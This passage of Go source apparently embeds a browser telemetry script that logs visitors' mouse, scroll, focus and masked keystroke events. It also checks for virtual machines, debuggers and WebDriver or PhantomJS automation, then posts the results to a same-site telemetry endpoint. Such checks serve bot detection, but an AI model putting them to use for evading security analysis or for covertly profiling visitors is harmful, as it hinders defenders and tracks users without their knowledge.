            focus: []
        },
        environment: {
            vm_detected: false,
            debugger_detected: false,
            automation_detected: false,
            artifacts: [],
            timing_anomaly: false,
            hardware_anomaly: false
        }
    };
    
    // Configuration
    var MAX_EVENTS = 100;
    var SEND_INTERVAL = 5000;
    
    // ==== BEHAVIOR TRACKING ====
    // Mouse tracking
    var lastMouseTime = 0;
    document.addEventListener('mousemove', function(e) {
        var now = Date.now();
        if (now - lastMouseTime > 100) {
            if (telemetryData.behavior.mouse.length < MAX_EVENTS) {
                telemetryData.behavior.mouse.push({
                    x: e.clientX,
                    y: e.clientY,
                    type: 'move',
                    timestamp: now
                });
            }
            lastMouseTime = now;
        }
    });
    
    document.addEventListener('click', function(e) {
        if (telemetryData.behavior.mouse.length < MAX_EVENTS) {
            telemetryData.behavior.mouse.push({
                x: e.clientX,
                y: e.clientY,
                type: 'click',
                timestamp: Date.now()
            });
        }
    });
    
    // Keyboard tracking
    document.addEventListener('keydown', function(e) {
        if (telemetryData.behavior.keyboard.length < MAX_EVENTS) {
            telemetryData.behavior.keyboard.push({
                key: 'hidden',
                type: 'keydown',
                timestamp: Date.now()
            });
        }
    });
    
    // Scroll tracking
    var lastScrollTime = 0;
    window.addEventListener('scroll', function(e) {
        var now = Date.now();
        if (now - lastScrollTime > 200) {
            if (telemetryData.behavior.scroll.length < MAX_EVENTS) {
                telemetryData.behavior.scroll.push({
                    scroll_y: window.scrollY,
                    timestamp: now
                });
            }
            lastScrollTime = now;
        }
    });
    
    // Focus tracking
    var trackFocus = function(e) {
        if (telemetryData.behavior.focus.length < MAX_EVENTS) {
            telemetryData.behavior.focus.push({
                element: e.target.tagName,
                type: e.type,
                timestamp: Date.now()
            });
        }
    };
    document.addEventListener('focus', trackFocus, true);
    document.addEventListener('blur', trackFocus, true);
    
    // ==== ENVIRONMENT DETECTION ====
    function runEnvironmentChecks() {
        var env = telemetryData.environment;
        
        // VM Detection
        try {
            if (screen.width === 1024 && screen.height === 768) {
                env.artifacts.push('Common VM resolution');
                env.vm_detected = true;
            }
            if (screen.colorDepth < 24) {
                env.artifacts.push('Low color depth');
                env.vm_detected = true;
            }
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (gl) {
                var vendor = gl.getParameter(gl.VENDOR) || "";
                var renderer = gl.getParameter(gl.RENDERER) || "";
                if (vendor.includes('VMware') || vendor.includes('VirtualBox')) {
                    env.artifacts.push('VM graphics vendor: ' + vendor);
                    env.vm_detected = true;
                }
                if (renderer.includes('llvmpipe')) {
                    env.artifacts.push('Software renderer detected');
                    env.vm_detected = true;
                }
            }
            if (navigator.hardwareConcurrency && navigator.hardwareConcurrency <= 2) {
                env.hardware_anomaly = true;
            }
            if (navigator.deviceMemory && navigator.deviceMemory <= 2) {
                env.hardware_anomaly = true;
            }
        } catch(e) {}
        
        // Debugger Detection
        try {
            var start = performance.now();
            debugger;
            var end = performance.now();
            if (end - start > 100) {
                env.debugger_detected = true;
                env.artifacts.push('Debugger timing anomaly');
            }
        } catch(e) {}
        
        // Automation Detection
        try {
            if (navigator.webdriver) {
                env.automation_detected = true;
                env.artifacts.push('WebDriver detected');
            }
            if (window.document.documentElement.getAttribute("webdriver")) {
                env.automation_detected = true;
                env.artifacts.push('documentElement webdriver attribute detected');
            }
            if (window.callPhantom || window._phantom) {
                env.automation_detected = true;
                env.artifacts.push('PhantomJS detected');
            }
        } catch(e) {}
    }
    
    // ==== DATA TRANSMISSION ====
    var sendTelemetryData = function() {
        // Run environment checks right before sending if we have no prior data, 
        // to catch late initializations.
        runEnvironmentChecks();

        if (telemetryData.behavior.mouse.length === 0 && 
            telemetryData.behavior.keyboard.length === 0 && 
            telemetryData.behavior.scroll.length === 0 &&
            telemetryData.behavior.focus.length === 0 &&
            !telemetryData.environment.vm_detected &&
            !telemetryData.environment.debugger_detected &&
            !telemetryData.environment.automation_detected) {
            return;
        }
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/api/telemetry/' + sessionId, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(telemetryData));
        
        // Reset behavior, but keep env findings
        telemetryData.behavior = {
            mouse: [],
            keyboard: [],
            scroll: [],
            focus: []
        };
    };
    
    // Initial run
    runEnvironmentChecks();
    
    // Schedule
    setInterval(sendTelemetryData, SEND_INTERVAL);
    window.addEventListener('beforeunload', sendTelemetryData);
})();
`, sessionID)
}

